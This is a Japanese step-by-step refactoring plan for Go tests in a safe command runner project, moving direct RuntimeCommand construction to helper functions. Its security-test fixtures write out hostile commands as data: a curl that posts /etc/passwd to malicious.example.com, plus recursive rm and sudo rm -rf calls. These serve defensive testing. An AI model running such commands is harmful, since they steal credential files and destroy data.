# 作業手順書: RuntimeCommand 直接作成からヘルパー関数への移行

## 作業の流れ

1. 優先度 高: ヘルパー関数を持つファイルの移行（3ファイル）
2. 優先度 中: 複雑なセットアップを持つテストの移行（4ファイル）
3. 最終確認

## 前提条件

- `internal/runner/executor/testing/helpers.go` に `CreateRuntimeCommand` と `CreateRuntimeCommandFromSpec` が実装済み
- テストが全て通る状態である (`make test` が成功する)

## 作業手順

### Phase 1: 優先度 高 - ヘルパー関数を持つファイルの移行

#### ファイル 1: test/security/output_security_test.go

**タスク 1-1: ヘルパー関数の更新**

- [x] import 文に `executortesting` を追加
  ```go
  import (
      // ... existing imports ...
      executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
  )
  ```

- [ ] `createRuntimeCommand()` 関数を更新（L24-33）
  ```go
  // Before
  func createRuntimeCommand(spec *runnertypes.CommandSpec) *runnertypes.RuntimeCommand {
      return &runnertypes.RuntimeCommand{
          Spec:             spec,
          ExpandedCmd:      spec.Cmd,
          ExpandedArgs:     spec.Args,
          ExpandedEnv:      make(map[string]string),
          ExpandedVars:     make(map[string]string),
          EffectiveWorkDir: "",
          EffectiveTimeout: 30,
      }
  }

  // After
  func createRuntimeCommand(spec *runnertypes.CommandSpec) *runnertypes.RuntimeCommand {
      return executortesting.CreateRuntimeCommandFromSpec(spec)
  }
  ```

- [ ] テスト実行: `go test -tags test -v ./test/security -run TestPathTraversalAttack`
- [ ] テスト実行: `go test -tags test -v ./test/security`
- [ ] コミット: "refactor(test): migrate output_security_test to use executortesting helper"

#### ファイル 2: test/performance/output_capture_test.go

**タスク 1-2: ヘルパー関数の更新**

- [ ] import 文に `executortesting` を追加
  ```go
  import (
      // ... existing imports ...
      executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
  )
  ```

- [ ] `createRuntimeCommand()` 関数を更新（L26-35）
  ```go
  // Before
  func createRuntimeCommand(spec *runnertypes.CommandSpec) *runnertypes.RuntimeCommand {
      return &runnertypes.RuntimeCommand{
          Spec:             spec,
          ExpandedCmd:      spec.Cmd,
          ExpandedArgs:     spec.Args,
          ExpandedEnv:      make(map[string]string),
          ExpandedVars:     make(map[string]string),
          EffectiveWorkDir: "",
          EffectiveTimeout: 30,
      }
  }

  // After
  func createRuntimeCommand(spec *runnertypes.CommandSpec) *runnertypes.RuntimeCommand {
      return executortesting.CreateRuntimeCommandFromSpec(spec)
  }
  ```

- [ ] テスト実行: `go test -tags test -v ./test/performance`
- [ ] コミット: "refactor(test): migrate output_capture_test to use executortesting helper"

#### ファイル 3: internal/runner/resource/normal_manager_test.go

**タスク 1-3: ヘルパー関数の更新**

- [ ] import 文に `executortesting` を追加
  ```go
  import (
      // ... existing imports ...
      executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
  )
  ```

- [ ] `createTestCommand()` 関数を更新（L177-186）
  ```go
  // Before
  func createTestCommand() *runnertypes.RuntimeCommand {
      spec := &runnertypes.CommandSpec{
          Name:        "test-command",
          Cmd:         "echo",
          Args:        []string{"hello", "world"},
          Timeout:     common.IntPtr(30),
      }
      return &runnertypes.RuntimeCommand{
          Spec:             spec,
          ExpandedCmd:      "echo",
          ExpandedArgs:     []string{"hello", "world"},
          ExpandedEnv:      make(map[string]string),
          ExpandedVars:     make(map[string]string),
          EffectiveWorkDir: "/tmp",
          EffectiveTimeout: 30,
      }
  }

  // After
  func createTestCommand() *runnertypes.RuntimeCommand {
      return executortesting.CreateRuntimeCommand("echo", []string{"hello", "world"},
          executortesting.WithName("test-command"),
          executortesting.WithWorkDir("/tmp"),
          executortesting.WithTimeout(common.IntPtr(30)))
  }
  ```

- [ ] テスト実行: `go test -tags test -v ./internal/runner/resource -run TestNormalManager`
- [ ] コミット: "refactor(test): migrate normal_manager_test to use executortesting helper"

**Phase 1 完了確認**

- [x] 全体テスト実行: `make test`
- [x] リンター実行: `make lint`

---

### Phase 2: 優先度 中 - 複雑なセットアップを持つテストの移行

#### ファイル 4: internal/runner/audit/logger_test.go

**タスク 2-1: テストケース内の直接作成を更新**

- [ ] import 文に `executortesting` を追加
  ```go
  import (
      // ... existing imports ...
      executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
  )
  ```

- [ ] テストケース 1 を更新（L40-48）
  ```go
  // Before
  cmd: &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name:       "test_user_group_cmd",
          RunAsUser:  "testuser",
          RunAsGroup: "testgroup",
      },
      ExpandedCmd:  "/bin/echo",
      ExpandedArgs: []string{"test"},
  },

  // After
  cmd: executortesting.CreateRuntimeCommand("/bin/echo", []string{"test"},
      executortesting.WithName("test_user_group_cmd"),
      executortesting.WithRunAsUser("testuser"),
      executortesting.WithRunAsGroup("testgroup")),
  ```

- [ ] テストケース 2 を更新（L62-70）
  ```go
  // Before
  cmd: &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name:       "test_failed_user_group_cmd",
          RunAsUser:  "testuser",
          RunAsGroup: "testgroup",
      },
      ExpandedCmd:  "/bin/false",
      ExpandedArgs: []string{},
  },

  // After
  cmd: executortesting.CreateRuntimeCommand("/bin/false", []string{},
      executortesting.WithName("test_failed_user_group_cmd"),
      executortesting.WithRunAsUser("testuser"),
      executortesting.WithRunAsGroup("testgroup")),
  ```

- [ ] テストケース 3 を更新（L84-91）
  ```go
  // Before
  cmd: &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name:      "test_user_only_cmd",
          RunAsUser: "testuser",
      },
      ExpandedCmd:  "/bin/id",
      ExpandedArgs: []string{},
  },

  // After
  cmd: executortesting.CreateRuntimeCommand("/bin/id", []string{},
      executortesting.WithName("test_user_only_cmd"),
      executortesting.WithRunAsUser("testuser")),
  ```

- [ ] テスト実行: `go test -tags test -v ./internal/runner/audit -run TestLogger`
- [ ] コミット: "refactor(test): migrate audit/logger_test to use executortesting helper"

#### ファイル 5: internal/runner/executor/environment_bench_test.go

**タスク 2-2: ベンチマーク内の直接作成を更新**

- [ ] import 文に `executortesting` を追加
  ```go
  import (
      // ... existing imports ...
      executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
  )
  ```

- [ ] ベンチマーク 1 を更新（L54-59）
  ```go
  // Before
  cmd := &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name: "bench-command",
      },
      ExpandedEnv: cmdEnv,
  }

  // After
  cmd := executortesting.CreateRuntimeCommand("echo", []string{},
      executortesting.WithName("bench-command"),
      executortesting.WithExpandedEnv(cmdEnv))
  ```

- [ ] ベンチマーク 2 を更新（L90-97）
  ```go
  // Before
  cmd := &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name: "test-command",
      },
      ExpandedEnv: map[string]string{
          "CMD_VAR": "value",
      },
  }

  // After
  cmd := executortesting.CreateRuntimeCommand("echo", []string{},
      executortesting.WithName("test-command"),
      executortesting.WithExpandedEnv(map[string]string{
          "CMD_VAR": "value",
      }))
  ```

- [ ] ベンチマーク実行: `go test -tags test -bench=BenchmarkBuildProcessEnvironment ./internal/runner/executor`
- [ ] コミット: "refactor(test): migrate executor/environment_bench_test to use executortesting helper"

#### ファイル 6: cmd/runner/integration_security_test.go

**タスク 2-3: 統合テスト内の直接作成を更新**

- [ ] import 文に `executortesting` を追加
  ```go
  import (
      // ... existing imports ...
      executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
  )
  ```

- [ ] テストケース 1 を更新（L267-275）
  ```go
  // Before
  cmd: &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name: "dangerous-rm",
          Cmd:  "rm",
          Args: []string{"-rf", "/tmp/should-not-execute-in-test"},
      },
      ExpandedCmd:  "rm",
      ExpandedArgs: []string{"-rf", "/tmp/should-not-execute-in-test"},
  },

  // After
  cmd: executortesting.CreateRuntimeCommand("rm", []string{"-rf", "/tmp/should-not-execute-in-test"},
      executortesting.WithName("dangerous-rm")),
  ```

- [ ] テストケース 2 を更新（L285-293）
  ```go
  // Before
  cmd: &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name:      "sudo-escalation",
          Cmd:       "sudo",
          Args:      []string{"rm", "-rf", "/tmp/test-sudo-target"},
          RunAsUser: "root",
      },
      ExpandedCmd:  "sudo",
      ExpandedArgs: []string{"rm", "-rf", "/tmp/test-sudo-target"},
  },

  // After
  cmd: executortesting.CreateRuntimeCommand("sudo", []string{"rm", "-rf", "/tmp/test-sudo-target"},
      executortesting.WithName("sudo-escalation"),
      executortesting.WithRunAsUser("root")),
  ```

- [ ] テストケース 3 を更新（L304-311）
  ```go
  // Before
  cmd: &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name: "data-exfil",
          Cmd:  "curl",
          Args: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
      },
      ExpandedCmd:  "curl",
      ExpandedArgs: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
  },

  // After
  cmd: executortesting.CreateRuntimeCommand("curl", []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
      executortesting.WithName("data-exfil")),
  ```

- [ ] テスト実行: `go test -tags test -v ./cmd/runner -run TestSecurityProtection`
- [ ] コミット: "refactor(test): migrate integration_security_test to use executortesting helper"

#### ファイル 7: internal/runner/group_executor_test.go

**タスク 2-4: 完全な RuntimeCommand 作成箇所を更新**

- [ ] import 文に `executortesting` を追加（既に存在する場合はスキップ）
  ```go
  import (
      // ... existing imports ...
      executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
  )
  ```

- [ ] TestRedactSensitiveDataInCommandEnvironment の使用箇所を更新（L1203-1213）
  ```go
  // Before
  cmd := &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name: "dangerous-cmd",
      },
      ExpandedCmd:  "/bin/echo",
      ExpandedArgs: []string{},
      ExpandedEnv: map[string]string{
          "DANGEROUS_VAR": "rm -rf /",
      },
      ExpandedVars: map[string]string{},
  }

  // After
  cmd := executortesting.CreateRuntimeCommand("/bin/echo", []string{},
      executortesting.WithName("dangerous-cmd"),
      executortesting.WithExpandedEnv(map[string]string{
          "DANGEROUS_VAR": "rm -rf /",
      }))
  ```

- [ ] TestExecuteCommandError_NonexistentCommand の使用箇所を更新（L1270-1278）
  ```go
  // Before
  cmd := &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name: "test-cmd",
      },
      ExpandedCmd:  "/nonexistent/command",
      ExpandedArgs: []string{},
      ExpandedEnv:  map[string]string{},
      ExpandedVars: map[string]string{},
  }

  // After
  cmd := executortesting.CreateRuntimeCommand("/nonexistent/command", []string{},
      executortesting.WithName("test-cmd"))
  ```

- [ ] TestExecuteGroupWithEnvironmentRedaction の使用箇所を更新（L1361-1372）
  ```go
  // Before
  cmd := &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name: "test-cmd",
      },
      ExpandedCmd:  "/bin/echo",
      ExpandedArgs: []string{},
      ExpandedEnv: map[string]string{
          "TEST_VAR": "test_value",
          "SECRET":   "secret_value",
      },
      ExpandedVars: map[string]string{},
  }

  // After
  cmd := executortesting.CreateRuntimeCommand("/bin/echo", []string{},
      executortesting.WithName("test-cmd"),
      executortesting.WithExpandedEnv(map[string]string{
          "TEST_VAR": "test_value",
          "SECRET":   "secret_value",
      }))
  ```

- [ ] TestExecuteGroupWithOutputCapture の使用箇所を更新（L1505-1512）
  ```go
  // Before
  cmd := &runnertypes.RuntimeCommand{
      Spec: &runnertypes.CommandSpec{
          Name: "test-cmd",
      },
      ExpandedCmd:  "/bin/echo",
      ExpandedArgs: []string{"hello"},
      ExpandedVars: map[string]string{},
  }

  // After
  cmd := executortesting.CreateRuntimeCommand("/bin/echo", []string{"hello"},
      executortesting.WithName("test-cmd"))
  ```

- [ ] テスト実行: `go test -tags test -v ./internal/runner -run "TestRedactSensitiveDataInCommandEnvironment|TestExecuteCommandError_NonexistentCommand|TestExecuteGroupWithEnvironmentRedaction|TestExecuteGroupWithOutputCapture"`
- [ ] コミット: "refactor(test): migrate group_executor_test RuntimeCommand creation to use executortesting helper"

**Phase 2 完了確認**

- [ ] 全体テスト実行: `make test`
- [ ] リンター実行: `make lint`

---

### Phase 3: 最終確認

- [ ] 全体テスト実行（全パッケージ）: `make test`
- [ ] リンター実行: `make lint`
- [ ] フォーマット実行: `make fmt`
- [ ] 変更内容のレビュー
  - [ ] `git diff test/security/output_security_test.go`
  - [ ] `git diff test/performance/output_capture_test.go`
  - [ ] `git diff internal/runner/resource/normal_manager_test.go`
  - [ ] `git diff internal/runner/audit/logger_test.go`
  - [ ] `git diff internal/runner/executor/environment_bench_test.go`
  - [ ] `git diff cmd/runner/integration_security_test.go`
  - [ ] `git diff internal/runner/group_executor_test.go`

---

## 作業時の注意事項

### 1. EffectiveWorkDir のデフォルト動作

`CreateRuntimeCommand` のデフォルト動作:
- `WithWorkDir()` を指定しない場合: `EffectiveWorkDir = os.TempDir()`
- `WithWorkDir("")` を指定した場合: `EffectiveWorkDir = ""`

既存の直接作成で `EffectiveWorkDir: ""` が指定されている場合、`CreateRuntimeCommand` を使用すると `os.TempDir()` になってしまうため、動作が変わる可能性があります。

**対策**: 既存コードで `EffectiveWorkDir: ""` の場合は、`WithEffectiveWorkDir("")` を明示的に指定する

### 2. タイムアウト解決ロジックの適用

`CreateRuntimeCommand` は自動的にタイムアウト解決ロジック（`common.ResolveTimeout`）を適用します。これにより、`TimeoutResolution` フィールドが適切に初期化されます。

既存の直接作成で `EffectiveTimeout` が固定値（例: 30）の場合、解決ロジックにより値が変わる可能性があります。

**対策**: 必要に応じて `WithTimeout()` オプションで明示的に指定する

### 3. Option パターンの使い方

- **必須パラメータ**: `cmd`, `args` は関数の引数として渡す
- **空文字列の扱い**:
  - `runAsUser=""`, `runAsGroup=""`: オプション自体を省略（デフォルトが空文字列）
  - `workDir=""`: `WithWorkDir("")` を明示的に指定（デフォルトは `os.TempDir()`）

### 4. 段階的な作業

- 1つのファイルを更新したら必ずテストを実行
- 問題があればすぐに修正してから次のファイルへ進む
- 各 Phase 完了後に全体テストを実行

### 5. コード整形

- 変更後は `make fmt` を実行してコードを整形
- import の順序が変わる可能性があるため、差分を確認

## トラブルシューティング

### テストが失敗する場合

1. **EffectiveWorkDir の違いを確認**
   - 既存: `EffectiveWorkDir: ""`
   - 新規: デフォルトで `os.TempDir()`
   - 対策: `WithEffectiveWorkDir("")` を明示的に指定

2. **ExpandedCmd/ExpandedArgs の違いを確認**
   - 既存: 独自の値が設定されている
   - 新規: デフォルトで `cmd` と `args` の値
   - 対策: `WithExpandedCmd()`, `WithExpandedArgs()` で明示的に指定

3. **タイムアウト解決の影響を確認**
   - 既存: `EffectiveTimeout` が固定値
   - 新規: タイムアウト解決ロジックが適用される
   - 対策: `WithTimeout()` で明示的に指定

### リンターエラーが発生する場合

1. `make fmt` を実行してコードを整形
2. import の未使用がある場合は削除
3. import の重複がある場合は統合

### ベンチマークの性能が変わった場合

ベンチマークテスト（environment_bench_test.go）では、初期化処理の追加によりわずかに性能が変わる可能性があります。これは許容範囲内であり、問題ありません。

## 完了基準

- [ ] 優先度 高の3ファイルが更新されている
- [ ] 優先度 中の4ファイルが更新されている
- [ ] 合計7ファイルで `executortesting` ヘルパー関数が使用されている
- [ ] 優先度 低のファイル（3ファイル）は直接作成のまま維持されている
- [ ] `make test` が成功する
- [ ] `make lint` が成功する
- [ ] git diff で変更内容を確認し、意図通りの変更であることを確認
- [ ] 各コミットメッセージが適切である

## 移行対象ファイルサマリー

### 優先度 高（3ファイル）
1. test/security/output_security_test.go - ヘルパー関数1箇所
2. test/performance/output_capture_test.go - ヘルパー関数1箇所
3. internal/runner/resource/normal_manager_test.go - ヘルパー関数1箇所

### 優先度 中（4ファイル）
4. internal/runner/audit/logger_test.go - 直接作成3箇所
5. internal/runner/executor/environment_bench_test.go - 直接作成2箇所
6. cmd/runner/integration_security_test.go - 直接作成3箇所
7. internal/runner/group_executor_test.go - 直接作成4箇所

### 優先度 低（移行しない、3ファイル）
- internal/runner/runnertypes/runtime_test.go - ユニットテストのため現状維持
- internal/runner/executor/executor_validation_test.go - バリデーションテストのため現状維持
- internal/runner/group_executor_test.go（一部）- 焦点を絞ったテストのため現状維持

**合計**: 7ファイル、16箇所の更新
